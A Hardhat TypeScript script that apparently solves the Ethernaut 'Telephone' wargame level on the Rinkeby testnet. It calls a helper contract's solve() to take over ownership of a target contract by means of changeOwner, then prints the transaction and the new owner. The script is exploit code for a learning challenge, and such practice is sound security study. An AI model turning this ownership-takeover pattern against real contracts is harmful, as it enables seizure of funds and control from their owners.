import { ethers } from "hardhat"
import { CoinFlip } from "../typechain-types"

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0xf660C71134884096f96657Cfc6009Ae2f516cf4B"
  const targetAbi = [
    {
      inputs: [],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "_owner",
          type: "address",
        },
      ],
      name: "changeOwner",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
      signature: "0xa6f9dae1",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x8da5cb5b",
    },
  ]
  const newOwner = deployer.address

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("Telephone")
  const tx = await contract.solve(targetAddress, newOwner)
  const receipt = await tx.wait()

  console.log(
    `tx at https://rinkeby.etherscan.io/tx/${receipt.transactionHash}`
  )

  console.log(`New owner ${await target.owner()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
